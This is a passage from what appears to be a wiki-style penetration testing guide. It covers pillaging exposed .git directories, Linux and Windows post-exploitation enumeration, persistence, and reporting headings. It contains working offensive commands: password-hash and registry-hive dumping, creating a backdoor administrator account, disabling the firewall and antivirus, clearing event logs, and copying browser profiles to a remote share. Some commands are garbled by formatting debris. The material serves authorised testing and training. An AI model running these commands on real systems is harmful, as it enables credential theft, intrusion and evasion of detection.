<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>SVN</li>
<li>CVS</li>
<li>MS Sourcesafe</li>
<li>WebDAV</li>
</ul>
<h4 id="git">Git</h4>
<p>Git is a distributed version control system (DVCS) and the meta directory (.git) contains all the necessary information to re-create the state of the repository at any given point in time. </p>
<p>Git is often used to deploy web applications and the .git meta directory is sometimes available to pillage.</p>
<p>'''Identify the repo'''</p>
<p>One quick way to find the repo is to look for the file <a href="http://example.com/.git/HEAD">http://example.com/.git/HEAD</a> and see if it contains a match to ^ref: refs/  W3AF (<a href="http://w3af.sourceforge.net/">http://w3af.sourceforge.net/</a>) contains a discovery plugin named findGit.py that will assist in finding git repositories of web targets.</p>
<p>Note: the .git directory is not always present in the root, but sometimes in sub directories depending on how a part of the application is deployed. Something like <a href="http://example.com/blog/.git/">http://example.com/blog/.git/</a></p>
<p>'''Cloning the repo'''</p>
<pre>git clone http://example.com/</pre>

<p>If an error like this is the result of the clone attempt then you have to resort to pillaging in different ways as the repo is not easily cloneable.</p>
<pre>fatal: http://example.com/info/refs not found: did you run git update-server-info on the server?</pre>

<p>'''Check for directory browsing'''</p>
<p>If directory browsing is open for <a href="http://example.com/.git/objects">http://example.com/.git/objects</a> then wget can be used to download the repo and then re-construct it.</p>
<p>Example:
<pre>
    wget -m —no-parent <a href="http://example.com/.git">http://example.com/.git</a>
    cd example.com
    git reset —hard
</pre></p>
<p>'''Other useful data'''</p>
<p>If both of these scenarios fail to get you the contents of the git repo there is still other information that may be of value. These files with predictable file names can contain very useful information and are detailed below.</p>
<ul>
<li>.git/index
“The index is a binary file (generally kept in .git/index) containing a sorted list of path names, each with permissions and the SHA1 of a blob object; git ls-files can show you the contents of the index:” (<a href="http://book.git-scm.com/7_the_git_index.html">http://book.git-scm.com/7_the_git_index.html</a>)</li>
</ul>
<h1 id="platform-details-php-cgi-etc">Platform details (.php, .cgi, etc)</h1>
<h1 id="files-that-may-contain-configuration-details-that-are-not-rendered">Files that may contain configuration details (that are not rendered)</h1>
<h1 id="old">.old</h1>
<h1 id="new">.new</h1>
<h1 id="bak">.bak</h1>
<h1 id="targz">.tar.gz</h1>
<h1 id="txt">.txt</h1>
<h1 id="database-dumps-sql">Database dumps .sql</h1>
<pre>
    mkdir example.com
    cd example.com
    mkdir .git
    wget get http://example.com/.git/index -O .git/index
    git init .
    git ls-files
</pre>

<ul>
<li>
<p>.git/config
Contains repo locations, usernames / email addresses, possibly other targets one could attack.</p>
</li>
<li>
<p>.git/logs/HEAD
Contains commit messages if any editing and committing has been done on the server.</p>
</li>
<li>
<p>.git/hooks/*
There are a number of files in the hooks directory that may contain sensitive information depending on the environment.</p>
</li>
</ul>
<h4 id="identify-custom-apps">Identify custom apps</h4>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<h4 id="backups">Backups</h4>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>Locally stored backup files</li>
<li>Central backup server</li>
<li>Remote backup solutions</li>
<li>Tape storage</li>
</ul>
<h3 id="business-impact-attacks">Business impact attacks</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<p>*What makes the biz money
*Steal It</p>
<h3 id="further-penetration-into-infrastructure">Further penetration into infrastructure</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<p>*Botnets</p>
<h4 id="pivoting-inside">Pivoting inside</h4>
<ul>
<li>Linux Commands
--Show users that have used ssh to connect to this host.
grep publickey /var/log/secure*|awk '{print <span><span class="MathJax_Preview">9"\t"</span><script type="math/tex">9"\t"</script></span>11"\t"$NF}'|sort -u</li>
</ul>
<p>user1 ::ffff:10.0.0.1 ssh2
user2 ::ffff:10.0.0.2 ssh2
user3 ::ffff:10.0.0.3 ssh2</p>
<p>--Show users that have used sudo.
grep sudo /var/log/secure*|awk -F: '{print $4}'|sort -u</p>
<p>user1
root
user2
user4</p>
<p>--Show users with active cron use.
cat /var/log/cron* |awk '$6 !~ /Updated/ {print $6}'|tr -d ()|sort -u</p>
<p>root
user5
user1
user2</p>
<p>--Look at a users password settings.
passwd -S user</p>
<h1 id="passwd-s-appuser">passwd -S appuser</h1>
<p>Password locked.</p>
<h1 id="passwd-s-root">passwd -S root</h1>
<p>Password set, MD5 crypt.</p>
<h1 id="passwd-s-bin">passwd -S bin</h1>
<p>Alternate authentication scheme in use.</p>
<p>--Users that have connected and from where.
for i in $(ls /var/log/wtmp*);do last -adf <span><span class="MathJax_Preview">{i}|awk '</span><script type="math/tex">{i}|awk '</script></span>1 !~ /wtmp/
{print <span><span class="MathJax_Preview">1,</span><script type="math/tex">1,</script></span>NF}'|sort -u; done</p>
<p>user1 testhost.example.com
root testhost2.example.com
user2 prodhost.example.com</p>
<p>--Who is logged in right now and from where.
$ who -Hu
NAME     LINE         TIME         IDLE          PID COMMENT
user1   pts/0        Jun 2 10:39   .         28001 (testhost.example.com)</p>
<p>--Pull IPv4 hosts from /etc/hosts, drop commented entries and localhost.
egrep -v "^[ \t]<em>#|^[ \t]</em>$|localhost" /etc/hosts
10.0.0.1  testhost.example.com testhost
10.0.0.2  testhost2.example.com testhost2
10.0.0.3  testhost3.example.com testhost3</p>
<p>--Pull commented IPv4 hosts from /etc/hosts
egrep "^[ \t]<em>#+[ \t]</em>([0-9]{1,3}.){3}[0-9]{1,3}" /etc/hosts</p>
<h1 id="10004-testhost4examplecom-testhost4">10.0.0.4  testhost4.example.com testhost4</h1>
<p>--Pull IPv6 hosts from /etc/hosts
egrep "(([:xdigit:]{0,4}):?:{1}){0,7}:?:{1}([:xdigit:]{0,4})?" /etc/hosts
::1                     loopback localhost      # loopback (lo0) name/address
::1FFF       ipv6test.example.com ipv6test</p>
<p>--Pull hostnames from known_hosts files for any user home you have
access to read.
for i in $(awk -F: '{print $6}' /etc/passwd|sort -u); do awk '{print
$1}' ${i}/.ssh/known_hosts 2&gt; /dev/null;done|tr ',' '\n'|sort -u
testhost
testhost3
testhost4
ipv6test
prodhost</p>
<p>--Show private keys and if they are encrypted
for i in $(grep "PRIVATE" *|egrep -v "END"|awk -F: '{print $1}'); do
print ${i};grep ENCRYPTED ${i};echo;done
id_dsa</p>
<p>id_dsap
Proc-Type: 4,ENCRYPTED</p>
<p>id_rsa32k
Proc-Type: 4,ENCRYPTED</p>
<p>id_rsa512</p>
<p>id_rsa512p
Proc-Type: 4,ENCRYPTED</p>
<p>--Look at the public keys and pull their type.  Numerical types are
SSH protocol 1.
for i in $(ls *.pub);do print ${i};awk '{print $1}' ${i};echo;done
id_dsa.pub
ssh-dss</p>
<p>id_dsap.pub
ssh-dss</p>
<p>id_rsa16k.pub
ssh-rsa</p>
<p>id_rsadef.pub
ssh-rsa</p>
<p>identity2048.pub
2048</p>
<p>identity768p.pub
768</p>
<p>identity864.pub
864</p>
<ul>
<li>Windows Commands</li>
<li>Token Stealing and Reuse</li>
<li>Password Cracking</li>
<li>Wifi connections to other devices</li>
<li>Password Reuse</li>
<li>Keyloggers</li>
<li>User enumeration</li>
<li>From Windows DC or from individual machines</li>
<li>Linux passwd file</li>
<li>MSSQL Windows Auth users</li>
</ul>
<h5 id="historylogs">History/Logs</h5>
<p>Linux
{|
| align#"left"|<code>date</code> 
|Display date and time
|-
|<code>df </code>
|Display disk free space 
|-
|<code>iostat </code>
|Kernel I/O statistics
|-
|<code>netstat</code>
|Network status and throughput
|-
|<code>lsof</code>
|List of open files
|-
|<code>ps</code>
|Process information
|-
|<code>top</code>
|Display and update sorted process information
|-
|<code>who</code>
|Display who is on the system <br>
Check ssh known hosts file<br>
Log files to see who connects to the server
|-
|}</p>
<p>.bash_history and other shell history files
syslog</p>
<p>MySQL
* MySQL History
* syslog</p>
<p>Windows
* Event Logs
* Recent opened files
* Browsers
* Favorites
* stored passwords
* stored cookies
* browsing history
* browser cache files
* syslog</p>
<h4 id="cleanup">Cleanup</h4>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<p>*Ensure documented steps of exploitation
*Ensure proper cleanup
*Remove Test Data
*Leave no trace
*Proper archiving and encryption of evidence to be handed back to customer
*Restore database from backup where necessary</p>
<h3 id="persistence">Persistence</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ol>
<li>
<p>Autostart Malware</p>
</li>
<li>
<p>Reverse Connections</p>
</li>
<li>
<p>Rootkits</p>
</li>
<li>
<p>User Mode</p>
</li>
<li>
<p>Kernel Based</p>
</li>
<li>
<p>C&amp;C medium (http, dns, tcp, icmp)</p>
</li>
<li>
<p>Backdoors</p>
</li>
<li>
<p>Implants</p>
</li>
<li>
<p>VPN with credentials</p>
</li>
</ol>
<h2 id="post-exploitation">Post Exploitation</h2>
<p>Post-exploitation activities are those that are conducted once a system as been compromised. These activities vary based upon the type of operating system.  They can very from running simple "whoami" to enumerating local accounts.  </p>
<h3 id="windows-post-exploitation">Windows Post Exploitation</h3>
<h4 id="blind-files">Blind Files</h4>
<p>(Things to pull when all you can do is to blindly read) LFI/Directory traversal(s).  Files that will have the same name across networks / Windows domains / systems.<br>
{|
! align#"left"| File
! Expected Contents / Description 
|-
|<code>%SYSTEMDRIVE%\boot.ini</code>
|A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.
|-
|<code>%WINDIR%\win.ini</code>
|This is another file to look for if boot.ini isn’t there or coming back, which is some times the case.
|-
|<code>%SYSTEMROOT%\repair\SAM</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\SAM</code>
|It stores users' passwords in a hashed format (in LM hash and NTLM hash).
|-
|<code>%SYSTEMROOT%\repair\system</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\system</code>
|
|}</p>
<h4 id="non-interactive-command-execution">Non Interactive Command Execution</h4>
<p>{|
! align#"left"| 
!<br />
|-
!
|
|}</p>
<h4 id="system">System</h4>
<p>{|
! align#"left"|Command
! Expected Output or Description 
|-
|
|Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.
|-
|<code>whoami /all</code>
|Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.
|-
|<code>set</code>
|Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.
|-<br />
|<code>fsutil fsinfo drives</code>
|Must be an administrator to run this, but it lists the current drives on the system.
|-
|<code><nowiki>reg query HKLM /s /d /f "C:* *.exe" | find /I "C:\" | find /V """"</nowiki></code>
|Locates insecurely registered executables within the system registry on Windows 7.
|}</p>
<h4 id="networking-ipconfig-netstat-net">Networking (ipconfig, netstat, net)</h4>
<p>{|
! align#left"|Command
! Expected Output or Description
|-
|<code>ipconfig /all</code>
|Displays the full information about your NIC’s.
|-
|<code>ipconfig /displaydns</code>
|Displays your local DNS cache.
|-
|<code>netstat -nabo</code>
|
|-
|<code><nowiki>netstat -s -p [tcp|udp|icpm|ip]</nowiki></code>
|
|-
|<code>netstat -r</code>
|
|-
|<code><nowiki>netstat -na | findstr :445</nowiki></code>
|
|-
|<code><nowiki>netstat -nao | findstr LISTENING</nowiki></code>
|XP and up for -o flag to get PIDnet acc
|-
|<code><nowiki>netstat -nao | findstr LISTENING</nowiki></code>
|XP and up for -o flag to get PID
|-
|<code><nowiki>netstat -na | findstr LISTENING</nowiki></code>
|
|-
|<code>netsh diag show all</code>
|
|-
|<code>net view</code>
|Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup.
|-
|<code>net view /domain</code><br>
<code>net view /domain:otherdomain</code>
|
|-
|<code>net user %USERNAME% /domain</code>
|Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership
|-
|<code>net user /domain</code>
|Lists all of the domain users
|-
|<code>net accounts</code>
|Prints the password policy for the local system. This can be different and superseded by the domain policy.
|-
|<code>net accounts /domain</code>
|Prints the password policy for the domain
|-
|<code>net localgroup administrators</code>
|Prints the members of the Administrators local group
|-
|<code>net localgroup administrators /domain</code>
|As this was supposed to use localgroup &amp; domain, this actually another way of getting <em>current</em> domain admins
|-
|<code>net group “Domain Admins” /domain</code>
|Prints the members of the Domain Admins group
|-
|<code>net group “Enterprise Admins” /domain</code>
|Prints the members of the Enterprise Admins group
|-
|<code>net group “Domain Controllers” /domain</code>
|Prints the list of Domain Controllers for the current domain
|-
|<code>nbtstat -a [ip here]</code>
|
|-
|<code>net share</code>
|Displays your currently shared SMB entries, and what path(s) they point to
|-
|<code>net session | find / “\”</code>
| <br />
|-
|<code>arp -a</code>
|Lists all the systems currently in the machine’s ARP table.
|-
|<code>route print</code>
|Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place
|-
|<code>browstat </code>
|Not working on XP
|
|}</p>
<p><a href="http://www.securityaegis.com/ntsd-backdoor/">http://www.securityaegis.com/ntsd-backdoor/</a></p>
<h4 id="configs">Configs</h4>
<p>{|
! align#left"|Command
! Expected Output or Description
|-
|<code>gpresult /z</code>
|Extremely verbose output of GPO (Group policy) settings as applied to the current system and user
|-
|<code>sc qc</code>
| <br />
|-
|<code>sc query</code>
| <br />
|-
|<code>sc queryex</code>
|
|-
|<code>type %WINDIR%\System32\drivers\etc\hosts</code>
| Print the contents of the Windows hosts file
|-
|<code>dir %PROGRAMFILES%</code>
|Prints a directory listing of the Program Files directory.
|-
|<code>echo %COMSPEC%</code>
|Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure.
|}</p>
<h4 id="finding-important-files">Finding Important Files</h4>
<p>{|
! align#left"|Command
! Expected Output or Description
|-
|<code>tree C: /f /a &gt; C:\output_of_tree.txt</code>
|Prints a directory listing in ‘tree’ format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders
|-
|<code>dir /a</code>
| <br />
|-
|<code>dir /b /s [Directory or Filename]</code>
| <br />
|-
|<code><nowiki>dir  /s /b | find /I “searchstring”</nowiki></code>
|Searches the output of dir from the root of the drive current drive () and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path.
|-
|<code><nowiki>command | find /c /v “”</nowiki></code>
|Counts the lines of whatever you use for ‘command’
|
|}</p>
<h4 id="files-to-pull-if-possible">Files To Pull (if possible)</h4>
<p>{|
! align#left"|File location
!Description / Reason
|-
|<code>%SYSTEMDRIVE%\pagefile.sys</code>
|Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size
|-
|<code>%WINDIR%\debug\NetSetup.log</code>
|
|-
|<code>%WINDIR%\repair\sam</code>
|
|-
|<code>%WINDIR%\repair\system</code>
| <br />
|-
|<code>%WINDIR%\repair\software</code>
| <br />
|-
|<code>%WINDIR%\repair\security</code>
| <br />
|-
|<code>%WINDIR%\iis6.log </code>
|iis5.log, ii6.log or iis7.log
| <br />
|-
|<code>%WINDIR%\system32\logfiles\httperr\httperr1.log</code>
|IIS 6 error log
|-
|<code>%SystemDrive%\inetpub\logs\LogFiles</code>
|IIS 7’s logs location
|-
|<code>%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log </code>
|Year month day
|-
|<code>%WINDIR%\system32\config\AppEvent.Evt</code>
| <br />
|-
|<code>%WINDIR%\system32\config\SecEvent.Evt</code>
| <br />
|-
|<code>%WINDIR%\system32\config\default.sav</code>
| <br />
|-
|<code>%WINDIR%\system32\config\security.sav</code>
|
|-
|<code>%WINDIR%\system32\config\software.sav</code>
| <br />
|-
|<code>%WINDIR%\system32\config\system.sav</code>
| <br />
|-
|<code>%WINDIR%\system32\CCM\logs*.log</code>
| <br />
|-
|<code>%USERPROFILE%\ntuser.dat</code>
| <br />
|-
|<code>%USERPROFILE%\LocalS<sub>1\Tempor</sub>1\Content.IE5\index.dat</code>
| <br />
|-
|<code>%WINDIR%\System32\drivers\etc\hosts</code>
| <br />
|}</p>
<h4 id="remote-system-access">Remote System Access####</h4>
<p>{|
! align#left"|Command
!Description / Reason
|-
|<code>net share \computername</code>
| <br />
|-
|<code>tasklist /V /S computername</code>
|
|-
|<code>qwinsta /SERVER:computername</code>
| <br />
|-
|<code>qprocess /SERVER:computername *</code>
| <br />
|-
|<code>net use \computername</code>
|This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed
|-
|<code>net use \computername /user:DOMAIN\username password</code>
|Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</p>
<p>This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.
|-
|<code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>
|Enable remote desktop.
|-
|<code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f</code>
|Enable remote assistance
|-
|<code>net time \computername </code>
|Shows the time of target computer)
|-  <br />
|<code>dir \computername\share_or_admin_share   </code>
|dir list a remote directory
|-  <br />
|<code>tasklist /V /S computername</code>
|Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount
|}</p>
<h4 id="auto-start-directories">Auto-Start Directories</h4>
<p><code>ver </code> Returns kernel version - like uname on *nix)<br>
{|
! align#left"|Version
!Location
|-
|Windows NT 6.1, 6.0
|%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
|-
|Windows NT 5.2, 5.1, 5,0
|%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\
|-
|Windows 9x
|%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
|-
|Windows NT 4.0, 3.51, 3.50
|%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\
|}</p>
<h4 id="binary-planting">Binary Planting</h4>
<p>{|
! align#left"|Location / File name
!Reason / Description
|-
|<code>msiexec.exe</code>
|Idea taken from here: <a href="http://goo.gl/E3LTa">http://goo.gl/E3LTa</a> - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path, you get code execution.
|-
|<code>%SystemRoot%\System32\wbem\mof\</code>
|Taken from stuxnet: <a href="http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf">http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf</a> Look for Print spooler vuln
|}</p>
<p><em>WMI
*</em><code>wmic bios</code>
**<code>wmic </code>
**<code>wmic qfe get hotfixid</code>
***This gets patches IDs
**<code>wmic startup</code>
**<code>wmic service</code>
**<code>wmic process </code>
***Get caption,executablepath,commandline
**<code>wmic process call create “process_name”</code>
<em><strong>Executes a program<br />
</strong><code>wmic process where name#”process_name” call terminate</code> 
***Terminates program<br />
*</em><code>wmic logicaldisk where drivetype#3 get name, freespace, systemname, filesystem, size, volumeserialnumber</code> 
***Hard drive information
**<code>wmic useraccount</code> 
***Usernames, sid, and various security related goodies
**<code>wmic useraccount get /ALL</code>
**<code>wmic share get /ALL</code> 
***You can use ? for gets help
**<code>wmic startup list full</code> 
***This can be a huge list!!!
**<code>wmic /node:"hostname" bios get serialnumber</code> 
***This can be great for finding warranty info about target</p>
<p><em>Reg Command exit
*</em><code>reg save HKLM\Security security.hive</code>  (Save security hive to a file)
**<code>reg save HKLM\System system.hive</code> (Save system hive to a file)
**<code>reg save HKLM\SAM sam.hive</code> (Save sam to a file)
**<code>reg add [\TargetIPaddr] [RegDomain][ \Key ]</code>
**<code>reg export [RegDomain][Key] [FileName]</code>
**<code>reg import [FileName ]</code>
**<code>reg query [\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!]</code> (you can to add /s for recurse all values )</p>
<h4 id="deleting-logs">Deleting Logs</h4>
<p><code>wevtutil el</code>  (list logs)<br>
<code>wevtutil cl <LogName></code> (Clear specific lowbadming)<br>
<code>del %WINDIR%*.log /a /s /q /f</code></p>
<h4 id="uninstalling-software-antivirus-non-interactive">Uninstalling Software “AntiVirus” (Non interactive)</h4>
<p><code>wmic product get name /value </code>(this gets software names)<br>
<code>wmic product where name#"XXX" call uninstall /nointeractive </code>(this uninstalls software)</p>
<h4 id="other">Other</h4>
<p><code>pkgmgr usefull  /iu :”Package”</code><br>
<code>pkgmgr usefull  /iu :”TelnetServer” </code>(Install Telnet Service ...)<br>
<code>pkgmgr /iu:”TelnetClient” </code>(Client )<br>
<code>rundll32.exe user32.dll, LockWorkStation </code>(locks the screen -invasive-)<br>
<code>wscript.exe <script js/vbs></code><br>
<code>cscript.exe <script js/vbs/c#></code><br>
<code>xcopy /C /S %appdata%\Mozilla\Firefox\Profiles*.sqlite \your_box\firefox_funstuff</code><br></p>
<h5 id="operating-specific">Operating Specific</h5>
<h6 id="win2k3">Win2k3</h6>
<p><code>winpop stat domainname</code></p>
<h6 id="vista7">Vista/7</h6>
<p><code>winstat features</code><br>
<code>wbadmin get status</code><br>
<code>wbadmin get items</code><br>
<code>gpresult /H gpols.htm</code><code><br>
<code>bcdedit /export <filename></code><br></p>
<h6 id="vista-sp1720082008r2-x86-x64">Vista SP1/7/2008/2008R2 (x86 &amp; x64)</h6>
<p>Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):<br></p>
<p><em>Note</em> Works well after bypassuac + getsystem (requires system privileges)<br></p>
<p><em>Note2</em> For Dism.exe to work on x64 systems, the long commands are necessary<br></p>
<p>To list features which can be enabled/disabled:<br>
<code>%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features</code><br></p>
<p>To enable a feature (TFTP client for example):<br></p>
<p><code>%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP</code><br></p>
<p>To disable a feature (again TFTP client):<br></p>
<p><code>%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP</code><br></p>
<h4 id="invasive-or-altering-commands">Invasive or Altering Commands</h4>
<p>These commands change things on the target and can lead to getting detected</p>
<p>{|
! align#left"|Command
!Reason / Description
|-
|<code>net user hacker hacker /add</code>
|Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’
|-
|<code>net localgroup administrators /add hacker</code>
<code>net localgroup administrators hacker /add</code>
|Adds the new user ‘hacker’ to the local administrators group
|-
|<code>net share nothing$#C: /grant:hacker,FULL /unlimited</code>
|Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.</p>
<p>One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind
|-
|<code>net user username /active:yes /domain</code>
|Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.
|-
|<code>netsh firewall set opmode disable</code>
|Disables the local windows firewall
|-
|<code>netsh firewall set opmode enable</code>
|Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.
|}</p>
<h4 id="support-tools-binaries-links-usage">Support Tools Binaries / Links / Usage</h4>
<p>REMEMBER: DO NOT RUN BINARIES YOU HAVEN’T VETTED</p>
<p>{|
! align#left"|Description
!Link to download
|-
|<code>carrot.exe /im /ie /ff /gc /wlan /vnc /ps /np /mp /dialup /pwdump</code>
|<a href="http://h.ackack.net/carrot-exe.html">http://h.ackack.net/carrot-exe.html</a>  <br />
|-
|<code>PwDump7.exe &gt; ntlm.txt</code>
|<a href="http://www.tarasco.org/security/pwdump_7/">http://www.tarasco.org/security/pwdump_7/</a><br />
Invasively Dumps Windows NTLM hashes. Holds the credentials for all accounts.
|-
|Nircommands
|<a href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a>   A collection of small nifty features.
|-
|<code>wce.exe</code>
|<a href="http://www.ampliasecurity.com/research/wce_v1_2.tgz">http://www.ampliasecurity.com/research/wce_v1_2.tgz</a>
    Pull NTLM hashes from login sessions out of memory, steal ks tickets from activerberoe processes and apply them to others.
|-
|<code>adfind.exe -b ou#ActiveDirectory,dc#example,dc#com -f "objectClass#user" sn givenName  samaccountname -nodn -adcsv &gt; exported_users.csv</code>
|<a href="http://www.joeware.net/freetools/">http://www.joeware.net/freetools/</a>  Joeware tools have been used by admins for a while. This command will output the firstname, lastname and username of everyone in the AD domain example.com. Edit as needed.
|}</p>
<h5 id="various-tools">Various tools</h5>
<p>(e.g. \hackarmoury.com\tools\all_binaries\fgdump.exe)
    Some examples of protocols in use:</p>
<p><a href="http://hackarmoury.com/tools">http://hackarmoury.com/tools</a></p>
<p>\hackarmoury.com\tools</p>
<p><a href="ftp://hackarmoury.com">ftp://hackarmoury.com</a></p>
<p>svn://hackarmoury.com</p>
<h3 id="obtaining-password-hashes-in-windows">Obtaining Password Hashes in Windows</h3>
<p>There are two general methods for obtaining the password hashes in Windows. One method is to inject code into the LSASS (Local Security Authority Subsystem Service) process and the other is to extract the hashes from the SAM, system, and security registry hives. Pwdump6, Fgdump, and the hashdump command in Meterpreter use the LSASS injection method and Creddump extracts passwords from the SAM, system, and security hives. Once the hashes have been extracted, you can crack the hashes to obtain the passwords or you can use the hashes in a pass the hash exploit.</p>
<h4 id="lsass-injection">LSASS Injection</h4>
<p>One of the pitfalls of using the LSASS injection method is the possibility of crashing the LSASS process, which will reboot the machine. Another pitfall is tools like Pwdump and Fgdump are often stopped by AV tools.</p>
<h5 id="pwdump6-and-fgdump">Pwdump6 and Fgdump</h5>
<p>Pwdump6 and Fgdump are available at <a href="http://www.foofus.net/~fizzgig">http://www.foofus.net/~fizzgig</a>. Fgdump implements a number of features that Pwdump6 does not and is the preferred tool to use. Also, the user account must be an administrator on the target machine.
* To dump passwords on the local host with the credential of the current user use: <code>fgdump</code>
* To dump passwords on the local host with other credentials use: <code>fgdump -h 127.0.0.1 -u adminuser</code>
* To dump passwords on a remote host with specified credentials use: <code>fgdump -h 192.168.0.1 -u adminuser -p password</code></p>
<h5 id="hashdump-in-meterpreter">Hashdump in Meterpreter</h5>
<p>From the meterpreter prompt run <code>hashdump</code>.
<pre>
meterpreter &gt; hashdump
Guest:501:******NOPASSWORD*******:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:******NOPASSWORD*******:ee96955033d6fa723cc2fccb7bec093d:::
</pre></p>
<h4 id="extracting-passwords-from-registry">Extracting Passwords from Registry</h4>
<p>You will need to copy the SAM, system, and security files from the target machine to your machine. The files are located in C:\WINDOWS\system32\config and are typically inaccessible while the machine is running. Fortunately, you can get a copy of the files from the registry in HKEY_LOCAL_MACHINE and some times you can find them in c:\WINDOWS\repair.</p>
<h5 id="copy-from-the-registry">Copy from the Registry</h5>
<p><pre>
reg save HKLM\SAM c:\sam.reg
reg save HKLM\SYSTEM c:\system.reg
reg save HKLM\SECURITY c:\security.reg
</pre>
If you get an "Access Denied" error message when trying to save the SECURITY hive then try:
<pre>
at 12:00 reg save HKLM\SECURITY c:\security.reg
</pre>
You are using the at command to schedule the reg command so set the time appropriately.</p>
<h5 id="extracting-the-hashes">Extracting the Hashes</h5>
<p>Creddump includes three python scripts designed to extract the local password hashes (pwdump.py), the cached credentials (cachedump.py), and the LSA secrets (lsadump.py). To get the local password hashes use: <code>pwdump.py system.reg sam.reg</code>. To get the cached credentials use: <code>cachedump.py system.reg security.reg</code>.</p>
<h4 id="extracting-passwords-from-registry-using-meterpreter">Extracting Passwords from Registry using Meterpreter</h4>
<p>In Meterpreter use the command <code>run post/windows/gather/hashdump</code> to get the local hashes from the SAM database.
To get the cached hashes you will need to download the cachedump.rb module from <a href="http://lab.mediaservice.net/code/cachedump.rb">http://lab.mediaservice.net/code/cachedump.rb</a> and put it into <msf3>/modules/post/windows/gather. Then you can run the command <code>run post/windows/gather/cachedump</code>.</p>
<h2 id="reporting">Reporting</h2>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<h3 id="executive-level-reporting">Executive-Level Reporting</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ol>
<li>
<p>Business Impact</p>
</li>
<li>
<p>Customization</p>
</li>
<li>
<p>Talking to the business</p>
</li>
<li>
<p>Affect bottom line</p>
</li>
<li>
<p>Strategic Roadmap</p>
</li>
<li>
<p>Maturity model</p>
</li>
<li>
<p>Appendix with terms for risk rating</p>
</li>
</ol>
<h3 id="technical-reporting">Technical Reporting</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ol>
<li>
<p>Identify systemic issues and technical root cause analysis</p>
</li>
<li>
<p>Maturity Model</p>
</li>
<li>
<p>Technical Findings</p>
</li>
<li>
<p>Description</p>
</li>
<li>Screen shots</li>
<li>Ensure all PII is correctly redacted</li>
<li>Request/Response captures</li>
<li>PoC examples</li>
<li>
